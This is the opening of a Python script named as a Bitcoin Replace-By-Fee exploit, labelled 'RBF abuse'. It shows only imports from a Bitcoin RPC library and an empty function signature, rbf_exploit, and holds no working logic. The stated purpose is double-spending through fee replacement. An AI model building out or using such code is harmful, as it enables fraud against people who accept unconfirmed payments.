# bitcoin_replace_by_fee_exploit.py
# RBF (Replace-By-Fee) abuse
from bitcoin.rpc import RawProxy
from bitcoin.core import CMutableTransaction, COutPoint, CTxIn, CTxOut
from bitcoin.core.script import CScript, OP_TRUE

def rbf_exploit(rpc, original_txid, new_fee):